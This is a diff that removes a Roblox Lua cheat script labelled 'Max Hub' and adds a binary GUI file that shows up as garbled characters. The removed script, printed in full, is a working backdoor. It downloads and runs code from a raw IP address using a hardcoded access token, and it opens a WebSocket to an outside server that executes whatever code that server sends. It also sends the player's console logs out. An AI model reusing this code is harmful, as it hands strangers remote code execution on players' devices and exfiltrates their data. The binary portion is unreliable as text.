@@ -1,113 +1,48 @@
-setclipboard("Max Hub Kaitun")
-game:GetService("Players").LocalPlayer:Kick("\n1 to Max\Best Blox Fruits Script")
-
-spawn(function() 
-local LocalPlayer = game.Players.LocalPlayer
-
-local HttpService = game:GetService("HttpService"); 
-local LogService = game:GetService("LogService"); 
---[[local o; 
-o = hookfunction(string.find, function(a, b) 
-    if not a or not b then return end 
-    return o(a, b)
-end) ]]
-
-local GC = getconnections or get_signal_cons
-    if GC then
-        for i,v in pairs(GC(game.Players.LocalPlayer.Idled)) do
-            if v["Disable"] then
-                v["Disable"](v)
-            elseif v["Disconnect"] then
-                v["Disconnect"](v)
-            end
-        end
-    else
-        local VirtualUser = game:GetService("VirtualUser")
-        Players.LocalPlayer.Idled:Connect(function()
-            VirtualUser:CaptureController()
-            VirtualUser:ClickButton2(Vector2.new())
-        end)
-    end
-
-
-local placeId = game.PlaceId
-if placeId == 2753915549 then
-    Sea = "Main"
-elseif placeId == 4442272183 then
-    Sea = "Dressrosa"
-elseif placeId == 7449423635 then
-    Sea = "Zou"
-end
-
-game.ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommE").OnClientEvent:Connect(function(p1, p2) 
-    if p1 == "ExpBoost" then 
-        _G.ExpBoost = p2
-    end 
-    if p1 == "SafeZone" then
-
-		
-		_G.Safezone = p2;
-		return
-	end
-end)
-getgenv().getsenv = function() 
-    return 
-    {
-        ["_G"] = 
-        {
-            CurrentWorld = Sea, 
-            InCombat = (function() 
-                return game.Players and game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:GetAttribute("InCombat") 
-            end)(), 
-            InSafeZone = _G.Safezone,
-            ServerData = 
-            {
-                ExpBoost = _G.ExpBoost
-            }
-        }
-    }
-end
-
-print(game:GetService("HttpService"):JSONEncode(getsenv()))
-
-		getgenv().print = function() end
-
-	
-loadstring(game:HttpGet('http://150.109.50.38/assets/Client.lua'))()({
-    Access_Token = "mUveZboOmlA5q5LCfcoLx6XnTm1qUqU9",
-    Device_Name  = "n/a", 
-    Note         = "Rac Ruoi Logger"
-})
-local Connection = getgenv().WebSocket.connect("wss://adu-0nny.onrender.com/?token=haha&isClient=true&clientName="..LocalPlayer.Name)
-
- LogContentType = {"Output", "Info", "Warning", "Error"}
-
-
-Connection.OnMessage:Connect(function(msg)
-
-    du = HttpService:JSONDecode(msg) 
-    if du.type == "execute" then 
-       loadstring(du.data)()
-    end
-end) 
-
-
-function Send(Content, Type) 
-    Connection:Send(HttpService:JSONEncode({
-            type = "emitConsole", 
-            data = 
-            {
-                Type = Type, 
-                Date = os.time(), 
-                From = LocalPlayer.Name, 
-                Content = Content
-            }
-        })) 
-end 
-
-Send("Loaded", "Info")
-LogService.MessageOut:Connect(function(Content, Type) 
-    local Vcl = Enum.MessageType
-    Send(Content, (Type == Vcl.MessageOutput and "Output") or (Type == Vcl.MessageInfo and "Info") or (Type == Vcl.MessageWarning and "Warning") or (Type == Vcl.MessageError and "Error"))
-end)
-    end)
+<roblox!‰ÿ
+
+     	           META$   "       ð      ExplicitAutoJoints   trueINST          ð       Frame       INST          ð   	   ScreenGui        INST   "       õ   	   TextLabel   P  
+INST          ð
+      UICorner       INST!          ð   
+   UIGradient          INST          ð
+      UIStroke       PROP          ð       Active PROP          ð
+       AnchorPoint
+        PROP"           ð       AttributesSerialize    PROP          ð       AutoLocalizePROP          ð    
+   AutomaticSize    PROP'   %       ð       BackgroundColor3zaabzaabzaabPROP%   #       ð       BackgroundTransparency~   PROP"   !       ð       BorderColor3          PROP          ð    
+   BorderMode    PROP          ð
+       BorderSizePixel    PROP          ð       Capabilities!        PROP          ð       ClipsDescendants PROP          ð       DefinesCapabilities PROP          ð    	   Draggable PROP          ð       InteractablePROP          ð	       LayoutOrder    PROP          ð       Name   FramePROP           ð       NextSelectionDown   PROP           ð       NextSelectionLeft   PROP!          ð       NextSelectionRight   PROP          ð
+       NextSelectionUp   PROP#   !       ð       Position|Ê
+zˆ–~        PROP$   "       ð       RootLocalizationTable   PROP          ð       Rotation    PROP          ð    
+   Selectable PROP$   "       ð       SelectionBehaviorDown    PROP$   "       ð       SelectionBehaviorLeft    PROP%   #       ð       SelectionBehaviorRight    PROP"           ð       SelectionBehaviorUp    PROP          ð	       SelectionGroup PROP#   !       ð       SelectionImageObject   PROP          ð       SelectionOrder    PROP          Ð       Size
+  `   †PROP          ð       SizeConstraint    PROP           ð    
+   SourceAssetId       PROP          ð       Style    PROP          ð       Tags    PROP          ð       VisiblePROP          ð       ZIndex   PROP"           ð      AttributesSerialize    PROP          ð      AutoLocalizePROP          ð      Capabilities!        PROP           ð      ClipToDeviceSafeAreaPROP          ð      DefinesCapabilities PROP          ð
+      DisplayOrder    PROP          ð      EnabledPROP          ð      Name	   ScreenGuiPROP          ð      ResetOnSpawnPROP$   "       ð      RootLocalizationTable   PROP$   "       ð      SafeAreaCompatibility   PROP          ð
+      ScreenInsets   PROP$   "       ð      SelectionBehaviorDown    PROP$   "       ð      SelectionBehaviorLeft    PROP%   #       ð      SelectionBehaviorRight    PROP"           ð      SelectionBehaviorUp    PROP          ð	      SelectionGroup PROP           ð   
+   SourceAssetId       PROP          ð      Tags    PROP          ð      ZIndexBehavior   PROP          ð      Active   PROP   ,       þ      AnchorPoint
+  P     PROP*   (       ð      AttributesSerialize            PROP          ð	      AutoLocalizePROP$   "       ð   
+   AutomaticSize            PROP+   =       ô      BackgroundColor3    P     PROP-   +       ð      BackgroundTransparency         PROP3   9       ð      BorderColor3  A~~~U ð VVV         PROP!          ð   
+   BorderMode            PROP&   $       ð      BorderSizePixel            PROP    -       þ      Capabilities!  P     PROP          ð
+      ClipsDescendants   PROP!          ð      DefinesCapabilities   PROP          ð   	   Draggable   PROP]   ¶       ð3      FontFace ,   rbxasset://fonts/families/SourceSansPro.json¼B /  7  6 7 p¼     PROP          ð	      InteractablePROP"           ð      LayoutOrder            PROP!          ð   
+   LineHeight         PROP2   0       ð!      LocalizationMatchIdentifier            PROP4   2       ð#      LocalizationMatchedSourceText            PROP*   (       ð      MaxVisibleGraphemes         PROP%   4       ÿ      Name	   TextLabel
+ PLabelPROP(   &       ð      NextSelectionDown           PROP(   &       ð      NextSelectionLeft           PROP)   '       ð      NextSelectionRight           PROP&   $       ð      NextSelectionUp           PROP'   %       ð      OpenTypeFeatures            PROP4   A       þ      Position}}}(($××Û(($ }} ËŒ Ù ãŽ  P     PROP          ð      RichText   PROP,   *       ð      RootLocalizationTable           PROP          ð      Rotation            PROP          ð   
+   Selectable   PROP,   *       ð      SelectionBehaviorDown            PROP,   *       ð      SelectionBehaviorLeft            PROP-   +       ð      SelectionBehaviorRight            PROP*   (       ð      SelectionBehaviorUp            PROP          ð      SelectionGroup   PROP+   )       ð      SelectionImageObject           PROP%   #       ð      SelectionOrder            PROP!   =       ï      Size  
+c®®®# P  RRRPROP%   #       ð      SizeConstraint            PROP!   .       þ   
+   SourceAssetId  P  PROP          ð
+      Tags            PROP:   9       ð      Text   Auto Farm: None   Max hub
+' ask: NonePROP0   7       ÷   
+   TextColor3  A~~~U ð VVV         PROP$   "       ð   
+   TextDirection            PROP          ð   
+   TextScaled   PROP          ð      TextSize‚‚‚ÀÀÀ      PROP%   =       ÿ      TextStrokeColor3  P     PROP-   +       ð      TextStrokeTransparency         PROP'   %       ð      TextTransparency            PROP#   !       ð      TextTruncate            PROP          ð      TextWrappedPROP%   #       ð      TextXAlignment         PROP%   #       ð      TextYAlignment         PROP          ð      VisiblePROP          ð      ZIndex         PROP"           ð      AttributesSerialize    PROP          ð      Capabilities!        PROP          ð      CornerRadius       PROP          ð      DefinesCapabilities PROP          ð
+      Name   UICornerPROP           ð   
+   SourceAssetId       PROP          ð      Tags    PROP&   $       ð      AttributesSerialize        PROP    %       ö      Capabilities!  P     PROP.   f       ô      Color  &€?      /  , P?    PROP           ð      DefinesCapabilities  PROP          ð      EnabledPROP$   )       @    õName
+   UIGradient PdientPROP          ö      Offset
+  P     PROP          ð
+      Rotation        PROP!   &       ö   
+   SourceAssetId  P   PROP          @    ÐTags        PROP*   M       ü      Transparency  $€?  P     PROP          ð
+      ApplyStrokeMode    PROP"           ð      AttributesSerialize    PROP          ð      Capabilities!        PROP          @    ðColor    ~UUV   PROP          ð      DefinesCapabilities PROP          ð      EnabledPROP          ð
+      LineJoinMode    PROP          ð
+      Name   UIStrokePROP           ð   
+   SourceAssetId       PROP          ð      Tags    PROP          ð   	   Thickness€€  PROP          ð
+      Transparency    PRNT   M       ? 	  
+0 /
+&  
+	 END     	       </roblox>
